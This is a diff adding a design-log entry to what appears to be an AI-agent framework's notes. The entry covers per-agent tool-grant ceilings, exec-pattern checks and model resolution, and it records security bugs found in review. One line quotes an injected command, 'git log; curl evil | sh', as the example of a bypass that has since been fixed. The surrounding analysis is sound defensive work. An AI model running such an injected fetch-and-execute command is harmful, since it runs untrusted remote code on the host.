@@ -16298,3 +16298,68 @@ been run against this codebase (a real, standing gap `01` §1.8 SC4/SC6 and `ver
 mjs` Q191 already disclosed for unrelated reasons). M13 P6 builds a strict test-adapter mode
 specifically so this class of gap — real, tested infrastructure with zero real callers — cannot recur
 silently a second time.
+
+## Q196 — M13 P4: per-step tool grant and model resolution — six judgement calls, and two real
+security bugs the critic rounds found in this piece's own first designs
+
+**Context:** `@forge/agents/resolve` (`resolveStepToolGrant`, `resolveStepModel`, `roleTagsForAgent`)
+replaces `packages/cli/src/commands/run/context.ts`'s `DEFAULT_TOOLS`/`resolveModel` with the real,
+per-dispatched-agent value. It is not yet wired into dispatch (M13 P5). Points `05`/`15` leave silent,
+each with the answer this piece proceeds with:
+
+1. **`isOps` role classification.** `checkToolCeiling`'s `roleTags.isOps` (`15` §15.3.2) gates whether a
+   `deploy:true` escalation may ever apply to a role, but no spec table enumerates "ops" roles. Of the
+   28 shipped `modules/fm-core/agents/*.agent.yaml`, exactly one (`sre`) declares `deploy: true` anywhere,
+   and `checkToolCeiling`'s own worked test uses `sre` as its `OPS` example. `isOps` is exactly
+   `{'sre'}`; fail-closed (an unlisted role, including `release`, is never ops).
+2. **Bare-boolean `tools.network`.** The base schema accepts a bare boolean (`05` §5.3's own example
+   writes `network: false`) or the ceiling layer's enum. Resolved here: `false -> 'none'`, a bare `true`
+   -> `'allowlist'` (never `'full'`; no shipped agent uses `true`).
+3. **No ceiling declared.** `AgentDefinition.ceiling` is optional; with none, the agent's own base
+   grant is the ceiling — no widening is possible, never "no ceiling means no limit".
+4. **`checkToolCeiling` cannot check `exec`.** Its `excessItems` is an exact-string diff, not
+   wildcard-aware: shipped `architect.agent.yaml`'s `tools.exec` (`'git log*'`) is a real subset of its
+   `ceiling.tools.exec` (`'git *'`) but not a literal member, so the base declaration would be refused on
+   every dispatch. `exec` is therefore carved out of `checkToolCeiling` and checked by this piece's own
+   `isExecSubsumed`/`patternCoversPattern`; every other dimension still goes through `checkToolCeiling`
+   unchanged. The ceiling check runs unconditionally (base `tools` vs own `ceiling`, plus any overlay),
+   and one merged grant is both checked and returned.
+5. **`security.toolCeilingEscalations` is schema-typed `unknown[]`** (`packages/schemas/src/config/
+   schema.ts`). `resolveStepToolGrant` accepts only pre-typed `Escalation[]`; whoever wires the config
+   list in (P5 or later) must validate it first — an unvalidated cast there would be the fail-open this
+   piece exists to prevent. Also: `checkToolCeiling` never reads an escalation's `expires`, so this piece
+   filters to active escalations first (expired, unparseable or exactly-now `expires` = lapsed).
+   `Date.parse` is timezone-dependent for zone-less strings (fails closed: lapses early); a strict ISO
+   requirement belongs in the config schema that eventually types this list.
+6. **`roster.split` siblings are not classified as review/critic (disclosed gap).** `roleTagsForAgent`
+   is a closed id list. A split sibling of `reviewer` (`15` §15.3.3) — or a `forge agent new --from
+   reviewer` copy (`15` §15.3.4) — is tagged `isReviewOrCritic: false`, so a `write:true` escalation
+   naming it is not refused. An `extends`-based mitigation was tried and reverted: the shipped
+   `splitSiblingSchema` (`{id, skills?, file_ownership?}`, `.strict()`) has no lineage field, so it fixed
+   nothing real and added a false positive. Whoever materialises split-sibling definitions must extend
+   `REVIEW_OR_CRITIC_ROLES` or give this function real lineage input. The escalation itself must be
+   hand-authored with `approvedBy`, so this is a footgun guard, not an adversarial bypass.
+
+**Real bugs found by the gauntlet in this piece's own designs** (see `GAUNTLET-LOG.md`, `## M13 P4`):
+(a) the first ceiling check verified a value engineered to never fail on untouched fields while
+returning a different one, so a self-inconsistent agent (own `tools` wider than own `ceiling`) slipped
+through the moment any overlay touched an unrelated field; (b) the first wildcard-aware `exec` check
+compared prefixes only, but `matchesExecPattern` exempts an *exact* pattern from the shell-operator
+veto its wildcard match applies — so exact `'git log; curl evil | sh'` was "covered" by ceiling
+`'git *'` and, once granted, ran unconditionally. Fixed by reusing adapter-kit's own
+`SHELL_OPERATOR_PATTERN` (now exported) for the exact-pattern-vs-wildcard-ceiling case.
+
+**Also recorded, non-blocking:**
+- `resolveStepModel` does not cross-check its model id against `PlatformAdapter.listModels()`: `05` §5.8
+  assigns that to `forge doctor`; `startSession` still refuses an id the adapter did not report.
+- `models.overrides` / `models.tiers` lookups use `Object.hasOwn` so an agent or adapter id like
+  `constructor` cannot resolve to an inherited function.
+- `checkToolCeiling` trusts enum values by type (`network: 'toString'` passes `NETWORK_ORDER` lookup);
+  overlays are meant to arrive through `agentOverlaySchema`, which enum-validates. Not fixed here
+  (adversarial-only, `QUALITY-BAR.md` §4.1); left for whoever wires an overlay producer.
+- `checkToolCeiling`'s `allowlistHosts` comparison is case-sensitive while `isHostAllowed` is not; over-
+  refuses only, so left alone.
+- No overlay-application mechanism exists yet (`AgentOverlay` has no callers), so `overlayTools` is
+  exercised only by this piece's tests; the base-grant integrity check is the path real dispatch hits.
+
+Full piece breakdown: `process/plans/PLAN-M13.md` P4.
